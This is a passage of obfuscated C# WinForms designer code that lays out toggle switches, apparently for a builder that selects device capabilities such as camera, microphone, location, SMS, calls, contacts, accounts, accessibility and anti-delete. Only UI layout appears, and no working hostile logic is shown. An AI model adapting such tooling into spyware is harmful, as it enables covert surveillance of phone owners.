		this.Panel16.Name = EXGuarder._202E5C4F;
		this.Panel16.Padding = new System.Windows.Forms.Padding(7);
		this.Panel16.Size = new System.Drawing.Size(860, 31);
		this.Panel16.TabIndex = 14;
		this.prim13.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim13.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim13.ForeColor = System.Drawing.Color.White;
		this.prim13.Location = new System.Drawing.Point(53, 7);
		this.prim13.Name = EXGuarder._6907153D;
		this.prim13.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim13.Size = new System.Drawing.Size(800, 17);
		this.prim13.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim13.Symbol = 62162;
		this.prim13.SymbolColor = System.Drawing.Color.White;
		this.prim13.SymbolSize = 21;
		this.prim13.TabIndex = 17;
		this.prim13.Text = EXGuarder._0D5E5A48;
		this.prim13.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkdraw.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkdraw.ActiveText = EXGuarder._08631C18;
		this.checkdraw.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkdraw.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkdraw.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkdraw.InActiveText = EXGuarder._08631C18;
		this.checkdraw.Location = new System.Drawing.Point(7, 7);
		this.checkdraw.Name = EXGuarder._24103F53;
		this.checkdraw.Padding = new System.Windows.Forms.Padding(4);
		this.checkdraw.Size = new System.Drawing.Size(46, 17);
		this.checkdraw.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkdraw.TabIndex = 16;
		this.checkdraw.Text = EXGuarder._3252241B;
		this.Panel15.Controls.Add(this.prim12);
		this.Panel15.Controls.Add(this.checkbtry);
		this.Panel15.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel15.Location = new System.Drawing.Point(0, 362);
		this.Panel15.Name = EXGuarder._69302634;
		this.Panel15.Padding = new System.Windows.Forms.Padding(7);
		this.Panel15.Size = new System.Drawing.Size(860, 31);
		this.Panel15.TabIndex = 13;
		this.prim12.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim12.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim12.ForeColor = System.Drawing.Color.White;
		this.prim12.Location = new System.Drawing.Point(53, 7);
		this.prim12.Name = EXGuarder._2623122A;
		this.prim12.Padding = new System.Windows.Forms.Padding(27, 0, 0, 0);
		this.prim12.Size = new System.Drawing.Size(800, 17);
		this.prim12.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim12.Symbol = 62016;
		this.prim12.SymbolColor = System.Drawing.Color.White;
		this.prim12.SymbolSize = 23;
		this.prim12.TabIndex = 17;
		this.prim12.Text = EXGuarder._6A214555;
		this.prim12.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkbtry.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkbtry.ActiveText = EXGuarder._08631C18;
		this.checkbtry.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkbtry.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkbtry.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkbtry.InActiveText = EXGuarder._08631C18;
		this.checkbtry.Location = new System.Drawing.Point(7, 7);
		this.checkbtry.Name = EXGuarder._2E6C590D;
		this.checkbtry.Padding = new System.Windows.Forms.Padding(4);
		this.checkbtry.Size = new System.Drawing.Size(46, 17);
		this.checkbtry.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkbtry.TabIndex = 16;
		this.checkbtry.Text = EXGuarder._2B1B3529;
		this.Panel14.Controls.Add(this.prim11);
		this.Panel14.Controls.Add(this.checkwallp);
		this.Panel14.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel14.Location = new System.Drawing.Point(0, 331);
		this.Panel14.Name = EXGuarder._36471E49;
		this.Panel14.Padding = new System.Windows.Forms.Padding(7);
		this.Panel14.Size = new System.Drawing.Size(860, 31);
		this.Panel14.TabIndex = 12;
		this.Panel14.Visible = false;
		this.prim11.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim11.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim11.ForeColor = System.Drawing.Color.White;
		this.prim11.Location = new System.Drawing.Point(53, 7);
		this.prim11.Name = EXGuarder._3D49515A;
		this.prim11.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim11.Size = new System.Drawing.Size(800, 17);
		this.prim11.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim11.Symbol = 57434;
		this.prim11.SymbolColor = System.Drawing.Color.White;
		this.prim11.SymbolSize = 21;
		this.prim11.TabIndex = 17;
		this.prim11.Text = EXGuarder._5A40100C;
		this.prim11.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkwallp.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkwallp.ActiveText = EXGuarder._08631C18;
		this.checkwallp.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkwallp.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkwallp.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkwallp.InActiveText = EXGuarder._08631C18;
		this.checkwallp.Location = new System.Drawing.Point(7, 7);
		this.checkwallp.Name = EXGuarder._5B104F3A;
		this.checkwallp.Padding = new System.Windows.Forms.Padding(4);
		this.checkwallp.Size = new System.Drawing.Size(46, 17);
		this.checkwallp.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkwallp.TabIndex = 16;
		this.checkwallp.Text = EXGuarder._35290B57;
		this.Panel13.Controls.Add(this.prim10);
		this.Panel13.Controls.Add(this.checkssms);
		this.Panel13.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel13.Location = new System.Drawing.Point(0, 300);
		this.Panel13.Name = EXGuarder._133D6C42;
		this.Panel13.Padding = new System.Windows.Forms.Padding(7);
		this.Panel13.Size = new System.Drawing.Size(860, 31);
		this.Panel13.TabIndex = 11;
		this.prim10.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim10.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim10.ForeColor = System.Drawing.Color.White;
		this.prim10.Location = new System.Drawing.Point(53, 7);
		this.prim10.Name = EXGuarder._1C0D6C5D;
		this.prim10.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim10.Size = new System.Drawing.Size(800, 17);
		this.prim10.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim10.Symbol = 57446;
		this.prim10.SymbolColor = System.Drawing.Color.White;
		this.prim10.SymbolSize = 21;
		this.prim10.TabIndex = 17;
		this.prim10.Text = EXGuarder._731D1100;
		this.prim10.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkssms.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkssms.ActiveText = EXGuarder._08631C18;
		this.checkssms.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkssms.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkssms.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkssms.InActiveText = EXGuarder._08631C18;
		this.checkssms.Location = new System.Drawing.Point(7, 7);
		this.checkssms.Name = EXGuarder._2D474677;
		this.checkssms.Padding = new System.Windows.Forms.Padding(4);
		this.checkssms.Size = new System.Drawing.Size(46, 17);
		this.checkssms.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkssms.TabIndex = 16;
		this.checkssms.Text = EXGuarder._40532942;
		this.Panel12.Controls.Add(this.prim9);
		this.Panel12.Controls.Add(this.checkcallph);
		this.Panel12.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel12.Location = new System.Drawing.Point(0, 269);
		this.Panel12.Name = EXGuarder._5A363843;
		this.Panel12.Padding = new System.Windows.Forms.Padding(7);
		this.Panel12.Size = new System.Drawing.Size(860, 31);
		this.Panel12.TabIndex = 10;
		this.prim9.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim9.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim9.ForeColor = System.Drawing.Color.White;
		this.prim9.Location = new System.Drawing.Point(53, 7);
		this.prim9.Name = EXGuarder._6D0C0F1A;
		this.prim9.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim9.Size = new System.Drawing.Size(800, 17);
		this.prim9.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim9.Symbol = 57488;
		this.prim9.SymbolColor = System.Drawing.Color.White;
		this.prim9.SymbolSize = 21;
		this.prim9.TabIndex = 17;
		this.prim9.Text = EXGuarder._103B3D12;
		this.prim9.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkcallph.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkcallph.ActiveText = EXGuarder._08631C18;
		this.checkcallph.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkcallph.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkcallph.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkcallph.InActiveText = EXGuarder._08631C18;
		this.checkcallph.Location = new System.Drawing.Point(7, 7);
		this.checkcallph.Name = EXGuarder._22400376;
		this.checkcallph.Padding = new System.Windows.Forms.Padding(4);
		this.checkcallph.Size = new System.Drawing.Size(46, 17);
		this.checkcallph.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkcallph.TabIndex = 16;
		this.checkcallph.Text = EXGuarder._4900282A;
		this.Panel11.Controls.Add(this.prim8);
		this.Panel11.Controls.Add(this.checkloc);
		this.Panel11.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel11.Location = new System.Drawing.Point(0, 238);
		this.Panel11.Name = EXGuarder._30272E0B;
		this.Panel11.Padding = new System.Windows.Forms.Padding(7);
		this.Panel11.Size = new System.Drawing.Size(860, 31);
		this.Panel11.TabIndex = 9;
		this.prim8.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim8.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim8.ForeColor = System.Drawing.Color.White;
		this.prim8.Location = new System.Drawing.Point(53, 7);
		this.prim8.Name = EXGuarder._5A10144E;
		this.prim8.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim8.Size = new System.Drawing.Size(800, 17);
		this.prim8.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim8.Symbol = 57473;
		this.prim8.SymbolColor = System.Drawing.Color.White;
		this.prim8.SymbolSize = 21;
		this.prim8.TabIndex = 17;
		this.prim8.Text = EXGuarder._73422A09;
		this.prim8.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkloc.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkloc.ActiveText = EXGuarder._08631C18;
		this.checkloc.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkloc.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkloc.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkloc.InActiveText = EXGuarder._08631C18;
		this.checkloc.Location = new System.Drawing.Point(7, 7);
		this.checkloc.Name = EXGuarder._1F31572D;
		this.checkloc.Padding = new System.Windows.Forms.Padding(4);
		this.checkloc.Size = new System.Drawing.Size(46, 17);
		this.checkloc.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkloc.TabIndex = 16;
		this.checkloc.Text = EXGuarder._5D0C6942;
		this.Panel10.Controls.Add(this.prim7);
		this.Panel10.Controls.Add(this.checkmic);
		this.Panel10.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel10.Location = new System.Drawing.Point(0, 207);
		this.Panel10.Name = EXGuarder._4A796506;
		this.Panel10.Padding = new System.Windows.Forms.Padding(7);
		this.Panel10.Size = new System.Drawing.Size(860, 31);
		this.Panel10.TabIndex = 8;
		this.prim7.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim7.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim7.ForeColor = System.Drawing.Color.White;
		this.prim7.Location = new System.Drawing.Point(53, 7);
		this.prim7.Name = EXGuarder._605A2369;
		this.prim7.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim7.Size = new System.Drawing.Size(800, 17);
		this.prim7.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim7.Symbol = 57471;
		this.prim7.SymbolColor = System.Drawing.Color.White;
		this.prim7.SymbolSize = 21;
		this.prim7.TabIndex = 17;
		this.prim7.Text = EXGuarder._20533009;
		this.prim7.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkmic.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkmic.ActiveText = EXGuarder._08631C18;
		this.checkmic.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkmic.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkmic.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkmic.InActiveText = EXGuarder._08631C18;
		this.checkmic.Location = new System.Drawing.Point(7, 7);
		this.checkmic.Name = EXGuarder._4C5D020B;
		this.checkmic.Padding = new System.Windows.Forms.Padding(4);
		this.checkmic.Size = new System.Drawing.Size(46, 17);
		this.checkmic.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkmic.TabIndex = 16;
		this.checkmic.Text = EXGuarder._74605901;
		this.Panel9.Controls.Add(this.prim6);
		this.Panel9.Controls.Add(this.checkaccounts);
		this.Panel9.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel9.Location = new System.Drawing.Point(0, 176);
		this.Panel9.Name = EXGuarder._704E4E52;
		this.Panel9.Padding = new System.Windows.Forms.Padding(7);
		this.Panel9.Size = new System.Drawing.Size(860, 31);
		this.Panel9.TabIndex = 7;
		this.prim6.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim6.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim6.ForeColor = System.Drawing.Color.White;
		this.prim6.Location = new System.Drawing.Point(53, 7);
		this.prim6.Name = EXGuarder._5F62175A;
		this.prim6.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim6.Size = new System.Drawing.Size(800, 17);
		this.prim6.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim6.Symbol = 62142;
		this.prim6.SymbolColor = System.Drawing.Color.White;
		this.prim6.SymbolSize = 21;
		this.prim6.TabIndex = 17;
		this.prim6.Text = EXGuarder._0767225E;
		this.prim6.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkaccounts.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkaccounts.ActiveText = EXGuarder._08631C18;
		this.checkaccounts.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkaccounts.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkaccounts.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkaccounts.InActiveText = EXGuarder._08631C18;
		this.checkaccounts.Location = new System.Drawing.Point(7, 7);
		this.checkaccounts.Name = EXGuarder._5536151B;
		this.checkaccounts.Padding = new System.Windows.Forms.Padding(4);
		this.checkaccounts.Size = new System.Drawing.Size(46, 17);
		this.checkaccounts.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkaccounts.TabIndex = 16;
		this.checkaccounts.Text = EXGuarder._40480F43;
		this.Panel8.Controls.Add(this.prim5);
		this.Panel8.Controls.Add(this.checkcalllog);
		this.Panel8.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel8.Location = new System.Drawing.Point(0, 145);
		this.Panel8.Name = EXGuarder._5D241959;
		this.Panel8.Padding = new System.Windows.Forms.Padding(7);
		this.Panel8.Size = new System.Drawing.Size(860, 31);
		this.Panel8.TabIndex = 6;
		this.Panel8.Visible = false;
		this.prim5.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim5.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim5.ForeColor = System.Drawing.Color.White;
		this.prim5.Location = new System.Drawing.Point(53, 7);
		this.prim5.Name = EXGuarder._1D082D59;
		this.prim5.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim5.Size = new System.Drawing.Size(800, 17);
		this.prim5.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim5.Symbol = 61589;
		this.prim5.SymbolColor = System.Drawing.Color.White;
		this.prim5.SymbolSize = 21;
		this.prim5.TabIndex = 17;
		this.prim5.Text = EXGuarder._5300272B;
		this.prim5.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkcalllog.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkcalllog.ActiveText = EXGuarder._08631C18;
		this.checkcalllog.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkcalllog.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkcalllog.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkcalllog.InActiveText = EXGuarder._08631C18;
		this.checkcalllog.Location = new System.Drawing.Point(7, 7);
		this.checkcalllog.Name = EXGuarder._6D01205F;
		this.checkcalllog.Padding = new System.Windows.Forms.Padding(4);
		this.checkcalllog.Size = new System.Drawing.Size(46, 17);
		this.checkcalllog.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkcalllog.TabIndex = 16;
		this.checkcalllog.Text = EXGuarder._36360537;
		this.Panel7.Controls.Add(this.prim4);
		this.Panel7.Controls.Add(this.checkcontact);
		this.Panel7.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel7.Location = new System.Drawing.Point(0, 114);
		this.Panel7.Name = EXGuarder._4C624847;
		this.Panel7.Padding = new System.Windows.Forms.Padding(7);
		this.Panel7.Size = new System.Drawing.Size(860, 31);
		this.Panel7.TabIndex = 5;
		this.prim4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim4.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim4.ForeColor = System.Drawing.Color.White;
		this.prim4.Location = new System.Drawing.Point(53, 7);
		this.prim4.Name = EXGuarder._09293173;
		this.prim4.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim4.Size = new System.Drawing.Size(800, 17);
		this.prim4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim4.Symbol = 57479;
		this.prim4.SymbolColor = System.Drawing.Color.White;
		this.prim4.SymbolSize = 21;
		this.prim4.TabIndex = 17;
		this.prim4.Text = EXGuarder._080C3768;
		this.prim4.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkcontact.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkcontact.ActiveText = EXGuarder._08631C18;
		this.checkcontact.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkcontact.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkcontact.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkcontact.InActiveText = EXGuarder._08631C18;
		this.checkcontact.Location = new System.Drawing.Point(7, 7);
		this.checkcontact.Name = EXGuarder._3C634544;
		this.checkcontact.Padding = new System.Windows.Forms.Padding(4);
		this.checkcontact.Size = new System.Drawing.Size(46, 17);
		this.checkcontact.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkcontact.TabIndex = 16;
		this.checkcontact.Text = EXGuarder._092B4337;
		this.Panel6.Controls.Add(this.prim3);
		this.Panel6.Controls.Add(this.checkcamera);
		this.Panel6.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel6.Location = new System.Drawing.Point(0, 83);
		this.Panel6.Name = EXGuarder._4F53541C;
		this.Panel6.Padding = new System.Windows.Forms.Padding(7);
		this.Panel6.Size = new System.Drawing.Size(860, 31);
		this.Panel6.TabIndex = 4;
		this.prim3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim3.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim3.ForeColor = System.Drawing.Color.White;
		this.prim3.Location = new System.Drawing.Point(53, 7);
		this.prim3.Name = EXGuarder._4424512F;
		this.prim3.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim3.Size = new System.Drawing.Size(800, 17);
		this.prim3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim3.Symbol = 57461;
		this.prim3.SymbolColor = System.Drawing.Color.White;
		this.prim3.SymbolSize = 21;
		this.prim3.TabIndex = 17;
		this.prim3.Text = EXGuarder._02445C14;
		this.prim3.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkcamera.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkcamera.ActiveText = EXGuarder._08631C18;
		this.checkcamera.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkcamera.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkcamera.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkcamera.InActiveText = EXGuarder._08631C18;
		this.checkcamera.Location = new System.Drawing.Point(7, 7);
		this.checkcamera.Name = EXGuarder._03725728;
		this.checkcamera.Padding = new System.Windows.Forms.Padding(4);
		this.checkcamera.Size = new System.Drawing.Size(46, 17);
		this.checkcamera.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkcamera.TabIndex = 16;
		this.checkcamera.Text = EXGuarder._52705B3B;
		this.Panel45.Controls.Add(this.prim2);
		this.Panel45.Controls.Add(this.checkaccfiles);
		this.Panel45.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel45.Location = new System.Drawing.Point(0, 52);
		this.Panel45.Name = EXGuarder._0C76135D;
		this.Panel45.Padding = new System.Windows.Forms.Padding(7);
		this.Panel45.Size = new System.Drawing.Size(860, 31);
		this.Panel45.TabIndex = 18;
		this.prim2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim2.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim2.ForeColor = System.Drawing.Color.White;
		this.prim2.Location = new System.Drawing.Point(53, 7);
		this.prim2.Name = EXGuarder._384A1239;
		this.prim2.Padding = new System.Windows.Forms.Padding(25, 0, 0, 0);
		this.prim2.Size = new System.Drawing.Size(800, 17);
		this.prim2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim2.Symbol = 61563;
		this.prim2.SymbolColor = System.Drawing.Color.White;
		this.prim2.SymbolSize = 21;
		this.prim2.TabIndex = 17;
		this.prim2.Text = EXGuarder._2E1B6615;
		this.prim2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkaccfiles.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkaccfiles.ActiveText = EXGuarder._08631C18;
		this.checkaccfiles.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkaccfiles.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkaccfiles.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkaccfiles.InActiveText = EXGuarder._08631C18;
		this.checkaccfiles.Location = new System.Drawing.Point(7, 7);
		this.checkaccfiles.Name = EXGuarder._36563E04;
		this.checkaccfiles.Padding = new System.Windows.Forms.Padding(4);
		this.checkaccfiles.Size = new System.Drawing.Size(46, 17);
		this.checkaccfiles.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkaccfiles.TabIndex = 16;
		this.checkaccfiles.Text = EXGuarder._40532942;
		this.Panel4.Controls.Add(this.prim1);
		this.Panel4.Controls.Add(this.checkaccess);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel4.Location = new System.Drawing.Point(0, 21);
		this.Panel4.Name = EXGuarder._534B1C27;
		this.Panel4.Padding = new System.Windows.Forms.Padding(7);
		this.Panel4.Size = new System.Drawing.Size(860, 31);
		this.Panel4.TabIndex = 3;
		this.prim1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.prim1.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.prim1.ForeColor = System.Drawing.Color.White;
		this.prim1.Location = new System.Drawing.Point(53, 7);
		this.prim1.Name = EXGuarder._0A181E72;
		this.prim1.Padding = new System.Windows.Forms.Padding(24, 0, 0, 0);
		this.prim1.Size = new System.Drawing.Size(800, 17);
		this.prim1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.prim1.Symbol = 61870;
		this.prim1.SymbolColor = System.Drawing.Color.White;
		this.prim1.SymbolSize = 20;
		this.prim1.TabIndex = 17;
		this.prim1.Text = EXGuarder._41055B75;
		this.prim1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.checkaccess.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkaccess.ActiveText = EXGuarder._08631C18;
		this.checkaccess.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkaccess.Dock = System.Windows.Forms.DockStyle.Left;
		this.checkaccess.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.checkaccess.InActiveText = EXGuarder._08631C18;
		this.checkaccess.Location = new System.Drawing.Point(7, 7);
		this.checkaccess.Name = EXGuarder._414C4111;
		this.checkaccess.Padding = new System.Windows.Forms.Padding(4);
		this.checkaccess.Size = new System.Drawing.Size(46, 17);
		this.checkaccess.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkaccess.TabIndex = 16;
		this.checkaccess.Text = EXGuarder._29791C17;
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel5.Location = new System.Drawing.Point(0, 0);
		this.Panel5.Name = EXGuarder._3161414C;
		this.Panel5.Size = new System.Drawing.Size(860, 21);
		this.Panel5.TabIndex = 2;
		this.TabPage3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.TabPage3.Controls.Add(this.Panel50);
		this.TabPage3.Controls.Add(this.Panel49);
		this.TabPage3.Controls.Add(this.Panel48);
		this.TabPage3.Controls.Add(this.Panel24);
		this.TabPage3.Controls.Add(this.Panel23);
		this.TabPage3.Controls.Add(this.Panel22);
		this.TabPage3.Controls.Add(this.Panel21);
		this.TabPage3.Controls.Add(this.Panel20);
		this.TabPage3.Controls.Add(this.Panel18);
		this.TabPage3.Controls.Add(this.Panel46);
		this.TabPage3.Controls.Add(this.Panel19);
		this.TabPage3.Location = new System.Drawing.Point(0, 40);
		this.TabPage3.Name = EXGuarder._67427237;
		this.TabPage3.Size = new System.Drawing.Size(860, 674);
		this.TabPage3.TabIndex = 2;
		this.TabPage3.Text = EXGuarder._4616661A;
		this.Panel50.Controls.Add(this.DrakeUISymbolLabel1);
		this.Panel50.Controls.Add(this.Checkcryptmsg);
		this.Panel50.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel50.Location = new System.Drawing.Point(0, 390);
		this.Panel50.Name = EXGuarder._6F782F00;
		this.Panel50.Padding = new System.Windows.Forms.Padding(13, 14, 13, 14);
		this.Panel50.Size = new System.Drawing.Size(860, 41);
		this.Panel50.TabIndex = 14;
		this.DrakeUISymbolLabel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DrakeUISymbolLabel1.Font = new System.Drawing.Font(EXGuarder._65142166, 9.5f);
		this.DrakeUISymbolLabel1.ForeColor = System.Drawing.Color.White;
		this.DrakeUISymbolLabel1.Location = new System.Drawing.Point(13, 14);
		this.DrakeUISymbolLabel1.Name = EXGuarder._1B05050D;
		this.DrakeUISymbolLabel1.Padding = new System.Windows.Forms.Padding(27, 0, 0, 0);
		this.DrakeUISymbolLabel1.Size = new System.Drawing.Size(801, 13);
		this.DrakeUISymbolLabel1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUISymbolLabel1.Symbol = 61572;
		this.DrakeUISymbolLabel1.SymbolColor = System.Drawing.Color.White;
		this.DrakeUISymbolLabel1.SymbolSize = 23;
		this.DrakeUISymbolLabel1.TabIndex = 17;
		this.DrakeUISymbolLabel1.Text = EXGuarder._06493510;
		this.DrakeUISymbolLabel1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Checkcryptmsg.ActiveColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.Checkcryptmsg.ActiveText = EXGuarder._08631C18;
		this.Checkcryptmsg.ButtonColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Checkcryptmsg.Dock = System.Windows.Forms.DockStyle.Right;
		this.Checkcryptmsg.Font = new System.Drawing.Font(EXGuarder._65142166, 12f);
		this.Checkcryptmsg.InActiveText = EXGuarder._08631C18;
		this.Checkcryptmsg.Location = new System.Drawing.Point(814, 14);
		this.Checkcryptmsg.Name = EXGuarder._6520724B;
		this.Checkcryptmsg.Size = new System.Drawing.Size(33, 13);
		this.Checkcryptmsg.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Checkcryptmsg.TabIndex = 16;
		this.Checkcryptmsg.Text = EXGuarder._6D6C2019;
		this.Panel49.Controls.Add(this.optn9);
		this.Panel49.Controls.Add(this.checkantdelete);
		this.Panel49.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel49.Location = new System.Drawing.Point(0, 349);
		this.Panel49.Name = EXGuarder._0A302063;
		this.Panel49.Padding = new System.Windows.Forms.Padding(13, 14, 13, 14);
		this.Panel49.Size = new System.Drawing.Size(860, 41);
		this.Panel49.TabIndex = 13;
		this.optn9.Dock = System.Windows.Forms.DockStyle.Fill;
		this.optn9.Font = new System.Drawing.Font(EXGuarder._65142166, 9.5f);
		this.optn9.ForeColor = System.Drawing.Color.White;
		this.optn9.Location = new System.Drawing.Point(13, 14);
		this.optn9.Name = EXGuarder._30716603;
		this.optn9.Padding = new System.Windows.Forms.Padding(27, 0, 0, 0);
		this.optn9.Size = new System.Drawing.Size(801, 13);
